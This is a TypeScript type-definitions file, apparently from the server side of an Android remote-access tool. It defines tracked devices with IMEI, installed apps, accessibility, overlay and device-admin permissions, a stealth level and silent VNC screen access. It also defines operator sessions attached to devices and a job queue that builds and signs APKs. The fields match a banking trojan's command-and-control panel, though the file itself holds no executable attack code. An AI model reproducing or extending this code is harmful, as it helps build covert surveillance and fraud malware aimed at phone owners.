import type WebSocket from 'ws';

export interface DeviceState {
  id: string;
  ws: WebSocket;
  deviceId: string;
  model: string;
  brand: string;
  androidVersion: string;
  sdkVersion: number;
  batteryLevel: number;
  isCharging: boolean;
  networkType: string;
  ipAddress: string;
  country: string;
  operator: string;
  imei: string;
  resolution: string;
  hasAccessibility: boolean;
  hasOverlay: boolean;
  hasAdmin: boolean;
  hasBatteryExemption: boolean;
  installedApps: string[];
  connectedAt: number;
  lastSeen: number;
  status: 'online' | 'idle' | 'offline';
  tags: string[];
  stealthLevel: number;
  vncActive: boolean;
  silentVncActive: boolean;
}

export interface OperatorState {
  id: string;
  ws: WebSocket;
  subscribedDeviceId: string | null;
  connectedAt: number;
}

export interface WsTextMessage {
  type: string;
  [key: string]: unknown;
}

export interface BuildJob {
  jobId: string;
  stage: 'queued' | 'building' | 'signing' | 'done' | 'error';
  progress: number;
  log: string[];
  outputPath?: string;
  error?: string;
}
